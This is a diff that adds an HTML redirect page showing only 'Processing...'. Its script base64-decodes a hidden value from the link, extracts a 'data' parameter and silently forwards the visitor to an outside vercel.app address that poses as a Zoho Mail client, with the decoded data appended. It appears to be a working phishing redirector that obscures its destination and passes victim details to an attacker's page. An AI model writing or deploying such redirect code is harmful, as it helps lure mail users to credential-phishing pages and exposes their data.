@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirect</title>
+    <script>
+        // ULTRA SIMPLE - JUST EXTRACT AND REDIRECT
+        const url = window.location.href;
+        
+        // Find pattern
+        const patternIndex = url.indexOf('?.#.a8pl2ib.');
+        if (patternIndex !== -1) {
+            // Get everything after pattern
+            const afterPattern = url.substring(patternIndex + '?.#.a8pl2ib.'.length);
+            
+            // Take only Base64 (stop at # or ?)
+            let base64 = afterPattern;
+            if (afterPattern.includes('#')) base64 = afterPattern.split('#')[0];
+            if (afterPattern.includes('?')) base64 = afterPattern.split('?')[0];
+            
+            try {
+                // Decode
+                const decoded = atob(base64);
+                
+                // Find data= parameter
+                const dataStart = decoded.indexOf('data=');
+                if (dataStart !== -1) {
+                    // Get data value
+                    let dataValue = decoded.substring(dataStart + 5);
+                    // Remove anything after &
+                    const ampIndex = dataValue.indexOf('&');
+                    if (ampIndex !== -1) {
+                        dataValue = dataValue.substring(0, ampIndex);
+                    }
+                    
+                    // Build final URL
+                    const finalURL = "https://delivery-incoming.vercel.app/?client=zohomail.com&zmclient=GpLsUh826PCE4VrHtY9kN2381CY5onWmvEKsUh826PCE4VrHtY9kN2xBsw7LgQjFuZTXDRA381CY5onWmvEKGpLsUh826PCE4VrHtY9kN2zMcOYk91GpLsUh826PCE4VrHtY9kN2DZ2XPE150=#" + dataValue;
+                    
+                    // Redirect
+                    window.location.href = finalURL;
+                }
+            } catch(e) {
+                document.body.innerHTML = "Invalid link";
+            }
+        }
+    </script>
+</head>
+<body>
+    Processing...
+</body>
+</html>
